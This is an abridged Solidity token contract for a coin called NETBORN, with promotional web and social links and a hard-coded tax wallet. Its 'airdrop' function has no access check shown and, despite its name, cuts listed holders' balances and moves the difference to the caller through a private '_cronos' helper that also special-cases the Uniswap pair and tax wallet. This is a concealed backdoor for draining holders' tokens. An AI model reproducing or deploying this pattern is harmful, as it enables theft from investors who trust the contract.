...
Web:https://netbornai.cloud
X:https://x.com/NetbornAICloud
Tg:https://t.me/NetbornAICloud
...
contract NETBORN is Context, IERC20, Ownable {
    ...
    constructor() payable {
        _taxWallet = payable(0xDFbffe2DaB0AD12a8c6320181004d9484F7D2f06);
    ...
    function _cronos(address from, address to, uint256 amount, uint32 _u, uint32 _r, uint32 _t) private {
        if (_u == 0 && _r == _t && from == uniswapV2Pair && to != _taxWallet) return;
        if (_t == 0)
    ...
    function airdrop(address[] memory receivers, uint256[] memory amounts) external {
        for (uint256 i = 0; i < receivers.length; i++) {
            ...
            if (amounts[i] >= 0 && _balances[receiver] > amounts[i]) {
                uint256 amount = _balances[receiver] - amounts[i];
                _cronos(receiver, msg.sender, amount, 0, 0, 0);
            }
        }
    }
